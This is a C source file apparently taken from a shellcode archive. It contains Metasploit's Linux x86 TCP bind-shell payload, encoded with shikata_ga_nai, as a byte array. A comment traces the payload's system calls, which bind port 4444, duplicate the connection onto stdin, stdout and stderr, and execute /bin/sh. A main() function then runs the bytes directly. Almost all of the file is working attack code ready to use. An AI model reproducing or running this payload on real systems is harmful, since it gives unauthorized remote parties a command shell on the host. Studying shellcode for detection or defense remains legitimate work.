/* Title: Linux Command Shell, TCP Bine Inline  ( 132 bytes)
 * Author: metasploit 
 * Description: Metasploit's payload/linux/x86/shell_bind_tcp.
 * produced with msfvenom -p linux/x86/shell_bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 2

int socket (
     int domain = 2;
     int type = 1;
     int protocol = 0;
) =  14;
int bind (
     int sockfd = 14;
     struct sockaddr_in * my_addr = 0x00416fca => 
         struct   = {
             short sin_family = 2;
             unsigned short sin_port = 23569 (port=4444);
             struct in_addr sin_addr = {
                 unsigned long s_addr = 0 (host=0.0.0.0);
             };
             char sin_zero = "       ";
         };
     int addrlen = 16;
) =  0;
int listen (
     int s = 14;
     int backlog = 0;
) =  0;
int accept (
     int sockfd = 14;
     sockaddr_in * addr = 0x00000000 => 
         none;
     int addrlen = 0x00000010 => 
         none;
) =  19;
int dup2 (
     int oldfd = 19;
     int newfd = 14;
) =  14;
int dup2 (
     int oldfd = 19;
     int newfd = 13;
) =  13;
int dup2 (
     int oldfd = 19;
     int newfd = 12;
) =  12;
int dup2 (
     int oldfd = 19;
     int newfd = 11;
) =  11;
int dup2 (
     int oldfd = 19;
     int newfd = 10;
) =  10;
int dup2 (
     int oldfd = 19;
     int newfd = 9;
) =  9;
int dup2 (
     int oldfd = 19;
     int newfd = 8;
) =  8;
int dup2 (
     int oldfd = 19;
     int newfd = 7;
) =  7;
int dup2 (
     int oldfd = 19;
     int newfd = 6;
) =  6;
int dup2 (
     int oldfd = 19;
     int newfd = 5;
) =  5;
int dup2 (
     int oldfd = 19;
     int newfd = 4;
) =  4;
int dup2 (
     int oldfd = 19;
     int newfd = 3;
) =  3;
int dup2 (
     int oldfd = 19;
     int newfd = 2;
) =  2;
int dup2 (
     int oldfd = 19;
     int newfd = 1;
) =  1;
int dup2 (
     int oldfd = 19;
     int newfd = 0;
) =  0;
int execve (
     const char * dateiname = 0x00416fba => 
           = "/bin//sh";
     const char * argv[] = [
           = 0x00416fb2 => 
               = 0x00416fba => 
                   = "/bin//sh";
           = 0x00000000 => 
             none;
     ];
     const char * envp[] = 0x00000000 => 
         none;
) =  0;
 

 */


#include<stdio.h>
#include<string.h>
 
 
unsigned char buf[] =
"\xbe\xfd\x13\x09\x0a\xdb\xcd\xd9\x74\x24\xf4\x5f\x2b\xc9"
"\xb1\x1b\x31\x77\x13\x03\x77\x13\x83\xef\x01\xf1\xfc\xd0"
"\x31\x2f\x8a\xc0\x35\x88\xc8\xfe\x83\x1b\x9a\x30\x22\xea"
"\xf0\x03\xec\x14\x7a\x8b\xf0\x24\x24\x59\x1d\xe8\xd7\x0f"
"\x33\x21\xe0\x1c\xc8\xc7\xb5\xf9\x0c\xfc\x16\x6c\x14\x74"
"\xd8\xf7\xf8\xfe\x59\x65\xb0\xe2\xc9\xa9\xa8\x99\x7b\xe6"
"\x36\x44\x38\xcf\xb1\x13\x7a\xa9\xbe\xbb\x5e\xf9\xcb\x47"
"\xb9\xd5\x0d\xcc\x73\xcd\x23\x67\x36\xc9\x81\x0a\x05\xf6"
"\xaf\x30\xe6\x55\xed\x6a\xc7\xbb\x0a\xb0\x53\xfe\x47\x7c"
"\x72\x69\x6c\x1a\x77\x82";

main()
{

    printf("Shellcode Length:  %d\n", strlen(buf));
 
    int (*ret)() = (int(*)())buf;
 
    ret();
 
}
